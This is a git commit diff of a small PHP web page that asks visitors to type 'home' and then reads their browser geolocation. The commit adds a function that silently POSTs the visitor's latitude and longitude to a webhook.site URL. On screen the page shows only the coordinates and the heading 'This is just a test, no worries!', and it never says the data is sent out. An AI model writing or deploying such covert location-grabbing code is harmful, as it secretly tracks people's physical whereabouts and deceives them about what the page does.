63089485cd95a3a2259f721eadec660e8d4c3b87
abolo <abolfazle0915501@gmail.com>
2024-11-23 23:58:01 +0100

    rth

--- index.php
+++ index.php
@@ -5,18 +5,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Document</title>
-  <!-- bank of icon  https://boxicons.com/  -->
-  <script src="https://unpkg.com/boxicons@2.1.4/dist/boxicons.js"></script>
-  <link rel="stylesheet" href="./style.css" />
   <script>
-    fetch("https://webhook.site/195c3dae-0ba0-469f-95ad-253b1b6d4016", { // Replace with your Webhook URL
-      method: "POST", // HTTP method
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(data), // Convert data to JSON
-    })
-
     window.onload = function() {
       document.getElementById("btn").addEventListener("click", getLocation);
     };
@@ -32,16 +21,45 @@
         if (inputCorrection == "home") {
           output.innerHTML =
             "latitude: " + latitude + "<br>" + "longitude: " + longitude;
+
+          // Send GPS data to Webhook.site
+          sendDataToWebhook(latitude, longitude);
         } else {
           alert("Please try again!");
         }
       });
     }
+
+    function sendDataToWebhook(latitude, longitude) {
+      const data = {
+        latitude,
+        longitude
+      };
+
+      // Replace the URL below with your Webhook URL
+      fetch("https://webhook.site/195c3dae-0ba0-469f-95ad-253b1b6d4016", {
+          method: "POST", // HTTP method
+          headers: {
+            "Content-Type": "application/json", // Specify JSON format
+          },
+          body: JSON.stringify(data), // Send GPS data as JSON
+        })
+        .then((response) => {
+          if (response.ok) {
+            console.log("Data successfully sent!");
+          } else {
+            console.error("Failed to send data!");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    }
   </script>
 </head>
 
 <body>
-  <h1>This is just a test no worry!</h1>
+  <h1>This is just a test, no worries!</h1>
   <div class="container">
     <input type="text" id="input" placeholder="write home here" />
     <button id="btn">submit</button>
